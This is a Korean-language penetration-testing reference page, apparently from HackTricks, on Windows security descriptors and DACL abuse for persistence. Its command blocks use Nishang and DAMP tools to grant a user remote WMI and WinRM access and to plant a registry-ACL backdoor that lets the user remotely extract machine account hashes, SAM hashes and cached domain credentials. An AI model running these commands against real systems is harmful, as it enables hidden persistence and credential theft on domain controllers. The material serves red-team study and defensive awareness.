# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

Windows security descriptor에는 소유자 SID, 기본 그룹 SID, 액세스를 제어하는 임의 액세스 제어 목록(DACL), 그리고 주로 감사를 위해 사용되는 시스템 액세스 제어 목록(SACL)이 포함됩니다. Security Descriptor Definition Language(SDDL)는 텍스트 표현이며, ACE 문자열의 형식은 `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`입니다.<sup>[[1]](#references)[[4]](#references)</sup>

security descriptor에는 보안 객체의 소유자와 해당 객체에 대한 특정 권한이 허용되거나 거부된 주체가 저장됩니다. 공격자가 DACL을 변경할 수 있다면, 일반적으로 관리자 역할이 필요한 권한을 낮은 권한의 주체에 부여할 수 있습니다.

따라서 제한적으로 수정된 descriptor는 persistence에 유용합니다. 계정은 명백한 권한 그룹 외부에 유지하면서 특정 관리 surface에 대한 액세스 권한을 계속 보유할 수 있습니다. 테스트하기 전에 원래 descriptor를 보존하여 변경 사항을 정확히 제거할 수 있도록 하세요.

### Access to WMI

사용자에게 **execute remotely WMI** 액세스 권한을 부여할 수 있습니다. [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### WinRM 액세스

Nishang의 `Set-RemotePSRemoting` 함수를 사용하여 사용자에게 원격 PowerShell/WinRM endpoint 액세스 권한을 부여합니다:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### 해시 원격 액세스

DAMP는 이후 machine-account hash, 로컬 SAM hash 및 cached domain credentials를 원격으로 가져올 수 있도록 하는 registry-ACL backdoor를 생성할 수 있습니다. 이러한 제한된 권한을 일반 계정에 부여하면—특히 domain controller에 대해—privileged-group membership 없이도 강력한 persistence를 확보할 수 있습니다.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Check [**Silver Tickets**](silver-ticket.md)에서 Domain Controller의 computer account hash를 어떻게 사용할 수 있는지 알아보세요.

## References

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Security descriptor string format](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
